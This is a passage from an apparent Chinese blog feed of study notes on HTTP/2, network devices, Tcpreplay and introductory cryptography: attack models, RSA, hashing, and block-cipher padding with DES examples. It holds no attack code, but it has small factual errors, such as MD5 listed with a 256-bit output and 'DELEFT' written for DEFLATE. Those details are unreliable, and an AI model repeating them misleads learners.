        <content type="html"><![CDATA[<h2 id="http2协议"><a href="#http2协议" class="headerlink" title="http2协议"></a>http2协议</h2><p>http2协议是一个二进制协议。采用二进制格式协议传输数据，而不是http/1.x的文本格式。</p><p>http/2源于SPDY，但仍有不同的地方，主要是以下两点：</p><ul><li>HTTP/2 支持明文 HTTP 传输，而 SPDY 强制使用 HTTPS</li><li>HTTP/2 消息头的压缩算法采用 HPACK，而非 SPDY 采用的 DELEFT</li></ul><p>注：spdy是Google开发的基于TCP的应用层协议，用以最小化网络延迟，提升网络速度，优化用户的网络使用体验。SPDY并不是一种用于替代HTTP的协议，而是对HTTP协议的增强。新协议的功能包括数据流的多路复用、请求优先级以及HTTP报头压缩。互联网工程任务组（IETF）对谷歌提出的SPDY协议进行了标准化，于2015年5推出了类似于SPDY协议的 HTTP 2.0 协议标准（简称HTTP/2）。谷歌因此宣布放弃对SPDY协议的支持，转而支持HTTP/2。此外，著名的开源HTTP服务器软件 Nginx 也于2015年9月移除了对SPDY的支持，转而支持HTTP/2。</p><h2 id="二进制格式"><a href="#二进制格式" class="headerlink" title="二进制格式"></a>二进制格式</h2><p>HTTP/1 的请求和响应报文，都是由起始行、首部和实体正文（可选）组成，各部分之间以文本换行符分隔。<br>HTTP/2 将请求和响应数据分割为更小的帧，并对它们采用二进制编码。<br>帧（Frame）：HTTP/2 数据通信的最小单位。<br>消息（Message）：指 HTTP/2 中逻辑上的 HTTP 消息。例如请求和响应等，消息由一个或多个帧组成<br>流（Stream）：存在于连接中的一个虚拟通道。流可以承载双向消息，每个流都有一个唯一的整数 ID。</p><p>HTTP/2 中，同域名下所有通信都在单个连接上完成，这个连接可以承载任意数量的双向数据流。每个数据流都以消息的形式发送，而消息又由一个或多个帧组成。多个帧之间可以乱序发送，因为根据帧首部的流标识可以重新组装。</p><p>Frame 是 HTTP/2 二进制格式的基础，Frame 的基本格式如下</p><p><img src="https://note.youdao.com/yws/api/personal/file/WEB838ae8fda562512d2d95b9d69dd73b1a?method=download&amp;shareKey=19abcf09a1c0f9e2d3f35b8ab0fc884f" alt="image"></p><h2 id="http2的影响"><a href="#http2的影响" class="headerlink" title="http2的影响"></a>http2的影响</h2><p>现在http2还没被大范围部署使用，我们也无法确定到底会发生什么变化，但至少可以参考SPDY的例子和曾经做过的实验来进行大概估计。</p><p>http2减少了网络往返传输的数量，并且用多路复用和快速丢弃不需要的流的办法来完全避免了head of line blocking的困扰。</p><p>它也支持大量并行流，所以即使网站的数据分发在各处也不是问题。</p><p>合理利用流的优先级，可以让客户端尽可能优先收到更重要的数据。</p><p>所有这些加起来，我认为页面载入时间和站点相应的速度都会更快。简而言之：更好的web体验。</p><p>但到底能变得多快，到底提升有多大呢？我认为目前很难说清楚。毕竟这些技术依然在早期，我们还没法看见客户端和服务器实现这些并真正受益于新协议所提供的强大功能。</p><h2 id="集线器、交换机、路由器"><a href="#集线器、交换机、路由器" class="headerlink" title="集线器、交换机、路由器"></a>集线器、交换机、路由器</h2><h3 id="集线器"><a href="#集线器" class="headerlink" title="集线器"></a>集线器</h3><p>集线器(Hub)工作在最底层(物理层)，没有相匹配的软件系统，是纯硬件设备,集线器主要用来连接计算机等网络终端。</p><p>集线器为<strong>共享式带宽</strong>，连接在集线器上的任何一个设备发送数据时，其他所有设备必须等待，此设备享有全部带宽，通讯完毕，再由其他设备使用带宽。正因此，集线器连接了一个冲突域的网络。所有设备相互交替使用，就好象大家一起过一根独木桥一样。</p><p>集线器<strong>不能判断数据包的目的地和类型</strong>，所以如果是广播数据包也依然转发，而且所有设备发出数据以广播方式发送到每个接口，这样集线器也连接了一个广播域的网络。</p><h3 id="交换机"><a href="#交换机" class="headerlink" title="交换机"></a>交换机</h3><p>交换机工作在数据链接层(第二层)，和集线器一样主要用于连接计算机等网络终端设备。允许连接在交换机上的设备并行通讯，好比高速公路上的汽车并行行使一般，设备间通讯不会再发生冲突，因此交换机打破了冲突域，交换机每个接口是一个冲突域，不会与其他接口发生通讯冲突。</p><p>有系统的交换机可以记录MAC地址表，发送的数据不会再以广播方式发送到每个接口，而是直接到达目的接口，节省了接口带宽。但是交换机和集线器一样不能判断广播数据包，会把广播发送到全部接口，所以交换机和集线器一样连接了一个广播域网络。</p><p>高端一点的交换机不仅可以记录MAC地址表，还可以划分VLAN（虚拟局域网）来隔离广播，但是VLAN间也同样不能通讯。要使VLAN间能够通讯，必须有三层设备介入。</p><h3 id="路由器"><a href="#路由器" class="headerlink" title="路由器"></a>路由器</h3><p>路由器工作在网络层(第三层)，主要用来进行网络与网络的连接，所有路由器都有自己的操作系统。路由器把数据从一个网络发送到另一个网络，这个过程就叫路由。路由器不仅能像交换机一样隔离冲突域，而且还能检测广播数据包，并丢弃广播包来隔离广播域，有效的扩大了网络的规模。</p><p>在路由器中记录着路由表，路由器以此来转发数据，以实现网络间的通讯。路由器的介入可以使交换机划分的VLAN实现互相通讯。</p><h2 id="数据包回放"><a href="#数据包回放" class="headerlink" title="数据包回放"></a>数据包回放</h2><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><table><thead><tr><th>name</th><th>complete connection</th><th>stateful</th><th>selected replay</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>TCPReplay|No Required|No|No<br>Tomahawk|Required|Yes|No<br>Mokey|No Required|Yes|No<br>Avalanche|Required|Yes|No<br>SocketReplay|No Required|Yes|Yes</p><h3 id="TcpReplay"><a href="#TcpReplay" class="headerlink" title="TcpReplay"></a>TcpReplay</h3><p>Tcpreplay是一个工具套件，用来测试各种网络设备，包括：交换机、路由器、防火墙、NIDS和IPS等。它使用嗅探工具抓取的数据包，允许你拆分客户端和服务端流量，重写2、3、4层头信息，最终将流量回放到网络中。3.4 版本包括以下部分：</p><ul><li><p>Tcpprep:将流量拆分为客户端和服务端两个方向，并存放为缓存文件</p></li><li><p>Tcprewrite:重写pcap文件的TCP/IP层和数据链路层的头信息</p></li><li><p>Tcpreplay:以可控的速度将pcap文件回放到网络中</p></li><li><p>Tcpreplay-edit:在tcpreplay基础上增加编辑功能</p></li><li><p>Tcpbirdge:桥接两个不同网段</p></li><li><p>Tcpcapinfo:pcap 文件解码器和编译器</p></li></ul><p>原文链接：<a href="https://www.cnblogs.com/jiayy/p/3447027.html" target="_blank" rel="noopener">https://www.cnblogs.com/jiayy/p/3447027.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 数据包分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> http </tag>
            
            <tag> http2 </tag>
            
            <tag> 数据包回放 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础六</title>
      <link href="/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%85%AD/"/>
      <url>/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h2 id="攻击模式"><a href="#攻击模式" class="headerlink" title="攻击模式"></a>攻击模式</h2><p>在我们攻击一个密码学系统时，我们或多或少会得到关于这个系统的一些信息。根据得到信息量的不同，我们可以采用的方法就可能不同。在当今的密码学分析时，一般我们都会假设攻击者知道密码学算法，这个假设是合理的，因为历史上有很多保密的算法最后都被人所知，比如 RC4。被知道的方式多重多样，比如间谍，逆向工程等。</p><p>这里我们根据攻击者获取密码学系统的信息的多少将攻击模式分为以下几类</p><ul><li>唯密文攻击：攻击者仅能获得一些加密过的密文。</li><li>已知明文攻击：攻击者有一些密文对应的明文。</li><li>选择明文攻击：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。</li><li>选择密文攻击：攻击者在开始攻击之前可以选择一些密文，并获取解密后的明文。如果攻击者在攻击图中可以根据已经获取的信息选择一些新的密文并获取对应的明文，则称为适应性选择密文攻击。</li><li>相关密钥攻击：攻击者可以获得两个或多个相关密钥的加密或解密后+ 的密文或明文。但是攻击者不知道这些密钥。</li></ul><h2 id="常见攻击方法"><a href="#常见攻击方法" class="headerlink" title="常见攻击方法"></a>常见攻击方法</h2><p>根据不同的攻击模式，可能会有不同的攻击方法，目前常见的攻击方法主要有</p><ul><li>暴力攻击</li><li>中间相遇攻击</li><li>线性分析</li><li>差分分析</li><li>不可能差分分析</li><li>积分分析</li><li>代数分析</li><li>相关密钥攻击</li><li>侧信道攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学攻击思路 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础五</title>
      <link href="/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%94/"/>
      <url>/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%94/</url>
      
        <content type="html"><![CDATA[<h2 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h2><p>在计算机世界中，我们可能会需要电子签名，因为我们大多数情况下会使用电子文件，那这时候怎么办呢？当然，我们仍然可以选择使用自己的名字。但其实还有另外一种方式，那就是采用数字签名，这种签名更加难以伪造，可信程度更高。数字签名的主要用处是确保消息确实来自于声称产生该消息的人。</p><p>数字签名依赖于非对称密码，因为我们必须确保一方能够做的事情，而另一方不能够做出这样的事情。其基本原理如下</p><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/signature/figure/Digital_Signature_diagram.png" alt="image"></p><h3 id="RSA数字签名"><a href="#RSA数字签名" class="headerlink" title="RSA数字签名"></a>RSA数字签名</h3><p>原理类似于 RSA 加密，只是这里使用私钥进行加密，将加密后的结果作为签名。</p><h3 id="DSA数字签名"><a href="#DSA数字签名" class="headerlink" title="DSA数字签名"></a>DSA数字签名</h3><p>//TODO</p><h2 id="证书格式"><a href="#证书格式" class="headerlink" title="证书格式"></a>证书格式</h2><h3 id="DER"><a href="#DER" class="headerlink" title="DER"></a>DER</h3><p>使用该扩展名的证书采用<strong>二进制编码</strong>，当然，这些证书也可以使用 CER 或者 CRT 作为扩展名。</p><h3 id="PEM"><a href="#PEM" class="headerlink" title="PEM"></a>PEM</h3><p>使用该扩展名的证书采用 Base64 编码，文件的开始是一行 —–BEGIN。</p><h3 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -outform der -in certificate.pem -out certificate.der</span><br><span class="line">openssl x509 -inform der -in certificate.cer -out certificate.pem</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数字签名 </tag>
            
            <tag> 证书格式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础四</title>
      <link href="/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%9B%9B/"/>
      <url>/2019/01/06/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E5%9B%9B/</url>
      
        <content type="html"><![CDATA[<h2 id="哈希函数"><a href="#哈希函数" class="headerlink" title="哈希函数"></a>哈希函数</h2><p>哈希函数（Hash Function）把消息或数据压缩成摘要，使得数据量变小。其一般模型如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">任意长度(m)消息 -&gt; hash散列函数 -&gt; 固定长度h(m)</span><br></pre></td></tr></table></figure></p><p>显然对于任何一个 hash 值，理论上存在若干个消息与之对应，即碰撞。</p><p>散列值的目的如下</p><ul><li>确保消息的完整性，即确保收到的数据确实和发送时的一样（即没有修改、插入、删除或重放），防止中间人篡改。</li><li>冗余校验</li><li>单向口令文件，比如 linux 系统的密码</li><li>入侵检测和病毒检测中的特征码检测</li></ul><p>目前的 Hash 函数主要有 MD5，SHA1，SHA256，SHA512。目前的大多数 hash 函数都是迭代性的，即使用同一个 hash 函数，不同的参数进行多次迭代运算。</p><table><thead><tr><th>算法类型</th><th>输出 Hash 值长度</th></tr></thead><tbody><tr><td></td></tr></tbody></table><p>MD5    |128 bit / 256 bit<br>SHA1 |    160 bit<br>SHA256    | 256 bit<br>SHA512 |    512 bit</p>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 哈希函数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础三</title>
      <link href="/2019/01/05/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%89/"/>
      <url>/2019/01/05/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%B8%89/</url>
      
        <content type="html"><![CDATA[<h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在非对称密码中，加密者与解密者所使用的密钥并不一样，典型的有 RSA 加密，背包加密，椭圆曲线加密。</p><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><p>RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。</p><p>RSA 算法的可靠性由<strong>极大整数因数分解</strong>的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。</p><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><h5 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h5><ul><li>随机选择两个不同大质数p和q，计算N=pxq</li><li>根据欧拉函数，求得r=φ(N)=φ(p)φ(q)=(p-1)(q-1)</li><li>选择一个小于r的整数e，使e和r互质。并求得e关于r的模反元素，命名为d，有ed≡1(mod r)。</li><li>将p和q的记录销毁。</li></ul><p>此时，(N,e)是公钥，(N,d)是私钥。</p><p>注：在数论，对正整数n，欧拉函数是小于n的正整数中与n互质的数的数目（φ(1)=1）。此函数以其首名研究者欧拉命名(Euler’s totient function)，它又称为Euler’s totient function、φ函数、欧拉商数等。 例如φ(8)=4，因为1,3,5,7均和8互质。</p><h5 id="消息加密"><a href="#消息加密" class="headerlink" title="消息加密"></a>消息加密</h5><p>首先需要将消息 m以一个双方约定好的格式转化为一个小于 N，且与N<br>互质的整数 n。如果消息太长，可以将消息分为几段，这也就是我们所说的块加密，后对于每一部分利用如下公式加密：<br>$n^e$ ≡ c (mod N)</p><h5 id="消息解密"><a href="#消息解密" class="headerlink" title="消息解密"></a>消息解密</h5><p>利用密钥 d进行解密。<br>$c^d$ ≡ n (mod N)</p><h4 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h4><ul><li><p>RSAtool</p><ul><li><p>安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/ius/rsatool.git</span><br><span class="line">cd rsatool</span><br><span class="line">python rsatool.py -h</span><br></pre></td></tr></table></figure></li><li><p>生成私钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321</span><br></pre></td></tr></table></figure></li></ul></li><li><p>RSA Converter</p><ul><li>根据给定的密钥对，生成pem文件</li><li>g根据n,e,d，生成p,q</li></ul></li><li><p>openssl</p><ul><li><p>查看公钥文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -pubin -in pubkey.pem -text -modulus</span><br></pre></td></tr></table></figure></li><li><p>解密</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsautl -decrypt -inkey private.pem -in flag.enc -out flag</span><br></pre></td></tr></table></figure></li></ul></li><li><p>分解整数工具</p><ul><li>网站分解<a href="http://factordb.com/" target="_blank" rel="noopener">http://factordb.com/</a> </li><li>命令行分解<a href="https://github.com/ryosan-470/factordb-pycli借用" target="_blank" rel="noopener">https://github.com/ryosan-470/factordb-pycli借用</a> factordb 数据库。</li><li><a href="https://sourceforge.net/projects/yafu/" target="_blank" rel="noopener">https://sourceforge.net/projects/yafu/</a></li></ul></li><li><p>python库</p><ul><li>primefac<br>整数分解库，包含了很多整数分解的算法。</li><li>gmpy</li><li>gmpy2<br>安装时，可能会需要自己另行安装 mfpr 与 mpc 库。</li><li>pycrypto</li></ul></li></ul><h4 id="侧信道攻击"><a href="#侧信道攻击" class="headerlink" title="侧信道攻击"></a>侧信道攻击</h4><p>能量分析攻击（侧信道攻击）是一种能够从密码设备中获取秘密信息的密码攻击方法．与其 他攻击方法不同：这种攻击利用的是密码设备的能量消耗特征，而非密码算法的数学特性．能量分析攻击是一种非入侵式攻击，攻击者可以方便地购买实施攻击所需要的设备：所以这种攻击对智能卡之类的密码设备的安全性造成了严重威胁。</p><p>能量分析攻击是安全领域内非常重要的一个部分，我们只在这里简单讨论下。</p><p>能量分析攻击分为： </p><ul><li>简单能量分析攻击（SPA），即对能量迹进行直观分析，肉眼看即可。 </li><li>差分能量分析攻击（DPA），基于能量迹之间的相关系数进行分析。</li></ul><h5 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h5><p>攻击者可获取与加解密相关的侧信道信息，例如能量消耗、运算时间、电磁辐射等等。</p><h3 id="背包加密"><a href="#背包加密" class="headerlink" title="背包加密"></a>背包加密</h3><h4 id="背包问题"><a href="#背包问题" class="headerlink" title="背包问题"></a>背包问题</h4><p>首先，我们先来介绍一下背包问题，假定一个背包可以称重 W，现在有 n 个物品，其重量分别为 $1_1$,$a_2$,…,$a_n$<br> 我们想问一下装哪些物品可以恰好使得背包装满，并且每个物品只能被装一次。这其实就是在解这样的一个问题：<br> $x_1$$a_1$+$x_2$$a_2$+…+$x_n$$a_n$ = W</p><p> 其中$x_i$只能为0和1，显然我们必须枚举所有的 n 个物品的组合才能解决这个问题，而复杂度也就是$2^n$，这也就是背包加密的妙处所在。</p><p> 在加密时，如果我们想要加密的明文为 x，那么我们可以将其表示为 n 位二进制数，然后分别乘上 $a_i$,即可得到加密结果。</p><p> 但是解密的时候，该怎么办呢？我们确实让其他人难以解密密文，但是我们自己也确实没有办法解密密文。</p><p>但是当$a_i$ 是超递增的话，我们就有办法解了，所谓超递增是指序列满足如下条件：第 i 个数大于前面所有数的和。</p><p>为什么满足这样的条件就可以解密了呢？这是因为如果加密后的结果大于 $a_n$的话，其前面的系数为必须 1 的。反之，无论如何也无法使得等式成立。因此，我们可以立马得到对应的明文。</p><h3 id="ECC"><a href="#ECC" class="headerlink" title="ECC"></a>ECC</h3><p>ECC 全称为椭圆曲线加密，EllipseCurve Cryptography，是一种基于椭圆曲线数学的公钥密码。与传统的基于大质数因子分解困难性的加密方法不同，ECC 依赖于解决椭圆曲线离散对数问题的困难性。它的优势主要在于相对于其它方法，它可以在使用较短密钥长度的同时保持相同的密码强度。目前椭圆曲线主要采用的有限域有</p><ul><li>以素数为模的整数域 GF(p)，通常在通用处理器上更为有效。</li><li>特征为 2 的伽罗华域 GF（2^m），可以设计专门的硬件。</li></ul><h3 id="格密码"><a href="#格密码" class="headerlink" title="格密码"></a>格密码</h3><p>格在数学上至少有两种含义</p><ul><li>定义在非空有限集合上的偏序集合 L，满足集合 L 中的任意元素 a，b，使得 a，b 在 L 中存在一个最大下界，和最小上界。具体参见 <a href="https://en.wikipedia.org/wiki/Lattice_(order)。" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Lattice_(order)。</a></li><li>群论中的定义，是 [Math Processing Error] 中的满足某种性质的子集。当然，也可以是其它群。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 现代密码学 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 非对称加密 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>现代密码学基础二</title>
      <link href="/2019/01/04/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%8C/"/>
      <url>/2019/01/04/%E7%8E%B0%E4%BB%A3%E5%AF%86%E7%A0%81%E5%AD%A6%E5%9F%BA%E7%A1%80%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="块密码"><a href="#块密码" class="headerlink" title="块密码"></a>块密码</h2><h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>所谓块加密就是每次加密一块明文，常见的加密算法有</p><ul><li>IDEA 加密</li><li>DES 加密</li><li>AES 加密</li></ul><p>块加密也是对称加密。</p><p>其实，我们也可以把块加密理解一种特殊的替代密码，但是其每次替代的是一大块。而正是由于一大块，明文空间巨大，而且对于不同的密钥，我们无法做一个表进行对应相应的密文，因此必须得有<strong>复杂</strong>的加解密算法来加解密明密文。</p><p>而与此同时，明文往往可能很长也可能很短，因此在块加密时往往需要两个辅助</p><ul><li>padding，即 padding 到指定分组长度</li><li>分组加密模式，即明文分组加密的方式。</li></ul><h3 id="基本策略"><a href="#基本策略" class="headerlink" title="基本策略"></a>基本策略</h3><p>在分组密码设计时，充分使用了 Shannon 提出的两大策略：混淆与扩散两大策略。</p><h4 id="混淆"><a href="#混淆" class="headerlink" title="混淆"></a>混淆</h4><p>混淆，Confusion，将密文与密钥之间的统计关系变得尽可能复杂，使得攻击者即使获取了密文的一些统计特性，也无法推测密钥。一般使用复杂的非线性变换可以得到很好的混淆效果，常见的方法如下</p><ul><li>S 盒</li><li>乘法</li></ul><h4 id="扩散"><a href="#扩散" class="headerlink" title="扩散"></a>扩散</h4><p>扩散，Diffusion，使得明文中的每一位影响密文中的许多位。常见的方法有</p><ul><li>线性变换</li><li>置换</li><li>移位，循环移位</li></ul><h3 id="常见加解密结构"><a href="#常见加解密结构" class="headerlink" title="常见加解密结构"></a>常见加解密结构</h3><p>目前块加密中主要使用的是结构是</p><ul><li>迭代结构，这是因为迭代结构便于设计与实现，同时方便安全性评估。</li></ul><h4 id="迭代结构"><a href="#迭代结构" class="headerlink" title="迭代结构"></a>迭代结构</h4><h5 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h5><p>迭代结构基本如下，一般包括三个部分</p><ul><li>密钥置换</li><li>轮加密函数</li><li>轮解密函数</li></ul><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/figure/iterated_cipher.png" alt="image"></p><h5 id="轮函数"><a href="#轮函数" class="headerlink" title="轮函数"></a>轮函数</h5><p>目前来说，轮函数主要有主要有以下设计方法</p><ul><li>Feistel Network，由 Horst Feistel 发明，DES 设计者之一。<ul><li>DES</li></ul></li><li>Substitution-Permutation Network(SPN)<ul><li>AES</li></ul></li><li>其他方案</li></ul><p>注：费思妥密码（英语：Feistel cipher）是用于构造分组密码的对称结构，以德国出生的物理学家和密码学家霍斯特·费斯妥（Horst Feistel）命名，他在美国IBM工作期间完成了此项开拓性研究。通常也称为费斯妥网络（Feistel network）。大部分分组密码使用该方案，包括数据加密标准（DES）。费斯妥结构的优点在于加密和解密操作非常相似，在某些情况下甚至是相同的，只需要逆转密钥编排。因此，实现这种密码所需的代码或电路大小能几乎减半。费斯妥网络是一种迭代密码，其中的内部函数称为轮函数。</p><p>注：代换-置换网络是一系列被应用于分组密码中相关的数学运算，代换（Substitution）和置换（Permutation）分别被称作S盒（替換盒，英语：S-boxes）和P盒（排列盒，英语：P-boxes）。这种加密网络使用明文和密钥作为输入，并通过交错的若干“轮”（或“层”）代换操作和置换操作产生密文。</p><h5 id="密钥扩展"><a href="#密钥扩展" class="headerlink" title="密钥扩展"></a>密钥扩展</h5><p>目前，密钥扩展的方法有很多，没有见到什么完美的密钥扩展方法，基本原则是使得密钥的每一个比特尽可能影响多轮的轮密钥。</p><h3 id="常见块加密算法"><a href="#常见块加密算法" class="headerlink" title="常见块加密算法"></a>常见块加密算法</h3><p>//TODO(ARX/DES/IDEA/AES/Simon and Speck)</p><h3 id="分组模式"><a href="#分组模式" class="headerlink" title="分组模式"></a>分组模式</h3><p>分组加密会将明文消息划分为固定大小的块，每块明文分别在密钥控制下加密为密文。当然并不是每个消息都是相应块大小的整数倍，所以我们可能需要进行填充。</p><h4 id="填充规则"><a href="#填充规则" class="headerlink" title="填充规则"></a>填充规则</h4><p>正如我们之前所说，在分组加密中，明文的长度往往并不满足要求，需要进行 padding，而如何 padding 目前也已经有了不少的规定。</p><p>常见的 填充规则 如下。需要注意的是，即使消息的长度是块大小的整数倍，仍然需要填充。</p><p>一般来说，如果在解密之后发现 Padding 不正确，则往往会抛出异常。我们也因此可以知道 Paddig 是否正确。</p><p>Pad with bytes all of the same value as the number of padding bytes (PKCS5 padding)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DES INPUT BLOCK  = f  o  r  _  _  _  _  _</span><br><span class="line">(IN HEX)           66 6F 72 05 05 05 05 05</span><br><span class="line">KEY              = 01 23 45 67 89 AB CD EF</span><br><span class="line">DES OUTPUT BLOCK = FD 29 85 C9 E8 DF 41 40</span><br></pre></td></tr></table></figure><p>Pad with 0x80 followed by zero bytes (OneAndZeroes Padding)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DES INPUT BLOCK  = f  o  r  _  _  _  _  _</span><br><span class="line">(IN HEX)           66 6F 72 80 00 00 00 00</span><br><span class="line">KEY              = 01 23 45 67 89 AB CD EF</span><br><span class="line">DES OUTPUT BLOCK = BE 62 5D 9F F3 C6 C8 40</span><br></pre></td></tr></table></figure></p><p>这里其实就是和 md5 和 sha1 的 padding 差不多。</p><p>Pad with zeroes except make the last byte equal to the number of padding bytes<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DES INPUT BLOCK  = f  o  r  _  _  _  _  _</span><br><span class="line">(IN HEX)           66 6f 72 00 00 00 00 05</span><br><span class="line">KEY              = 01 23 45 67 89 AB CD EF</span><br><span class="line">DES OUTPUT BLOCK = 91 19 2C 64 B5 5C 5D B8</span><br></pre></td></tr></table></figure></p><p>Pad with zero (null) characters<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DES INPUT BLOCK  = f  o  r  _  _  _  _  _</span><br><span class="line">(IN HEX)           66 6f 72 00 00 00 00 00</span><br><span class="line">KEY              = 01 23 45 67 89 AB CD EF</span><br><span class="line">DES OUTPUT BLOCK = 9E 14 FB 96 C5 FE EB 75</span><br></pre></td></tr></table></figure></p><p>Pad with spaces<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">DES INPUT BLOCK  = f  o  r  _  _  _  _  _</span><br><span class="line">(IN HEX)           66 6f 72 20 20 20 20 20</span><br><span class="line">KEY              = 01 23 45 67 89 AB CD EF</span><br><span class="line">DES OUTPUT BLOCK = E3 FF EC E5 21 1F 35 25</span><br></pre></td></tr></table></figure></p><h4 id="ECB模式"><a href="#ECB模式" class="headerlink" title="ECB模式"></a>ECB模式</h4><p>ECB 模式全称为电子密码本模式（Electronic codebook）。</p><h5 id="加密"><a href="#加密" class="headerlink" title="加密"></a>加密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ecb_encryption.png" alt="image"></p><h5 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h5><p><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ecb_decryption.png" alt="image"></p><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul><li>实现简单。</li><li>不同明文分组的加密可以并行计算，速度很快。</li></ul><h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul><li>同样的明文块会被加密成相同的密文块，不会隐藏明文分组的统计规律。正如下图所示<br><img src="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/figure/ecb_bad_linux.png" alt="image"></li></ul><p>为了解决统一明文产生相同密文的问题，提出了其它的加密模式。</p><h5 id="应用"><a href="#应用" class="headerlink" 